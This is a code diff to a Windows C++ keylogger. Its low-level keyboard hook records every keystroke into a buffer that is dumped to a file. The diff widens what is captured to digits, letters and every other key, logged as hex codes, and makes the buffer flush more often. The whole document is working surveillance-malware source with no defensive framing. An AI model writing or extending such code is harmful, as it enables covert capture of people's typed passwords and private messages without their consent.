@@ -1,9 +1,10 @@
 #define _CRT_SECURE_NO_WARNINGS
+#include <cstdlib>
 #include <fstream>
-#include <stdlib.h>
-#include <windows.h>
-#include <vector>
+#include <sstream>
 #include <string>
+#include <vector>
+#include <windows.h>
 
 std::string fileName;
 std::vector<std::string> codepointStringBuffer;
@@ -81,7 +82,11 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 codepointStringBuffer.push_back(std::string("\n<BACKWARDS>"));
             } else if (vkCode == VK_TAB) {
                 codepointStringBuffer.push_back(std::string("\n<TAB>"));
-            } else {
+            } else if (std::isdigit(vkCode)) {
+                std::string s{ (char) vkCode };
+                codepointStringBuffer.push_back(std::string("\n"));
+                codepointStringBuffer.push_back(s);
+            } else if (std::isalpha(vkCode)) {
                 char ch = (char) vkCode;
 
                 BOOL lowerCase;
@@ -93,21 +98,25 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 }
 
                 if (lowerCase) {
-                    if (std::isalnum(vkCode)) {
-                        std::string s{ ch };
-                        codepointStringBuffer.push_back(std::string("\n"));
-                        codepointStringBuffer.push_back(s);
-                    }
+                    std::string s{ ch };
+                    codepointStringBuffer.push_back(std::string("\n"));
+                    codepointStringBuffer.push_back(s);
                 } else {
-                    if (std::isalnum(vkCode)) {
-                        std::string s{ (char)(ch + 32) };
-                        codepointStringBuffer.push_back(std::string("\n"));
-                        codepointStringBuffer.push_back(s);
-                    }
+                    std::string s{ (char)(ch + 32) };
+                    codepointStringBuffer.push_back(std::string("\n"));
+                    codepointStringBuffer.push_back(s);
                 }
+            } else {
+                // Handle the remaining key codes:
+                std::stringstream ss;
+                ss << std::hex << vkCode;
+                std::string s;
+                ss >> s;
+                codepointStringBuffer.push_back(std::string("\n0x"));
+                codepointStringBuffer.push_back(s);
             }
 
-            if (codepointStringBuffer.size() > 30) {
+            if (codepointStringBuffer.size() >= 13) {
                 DumpCharacterBuffer();
             }
     }
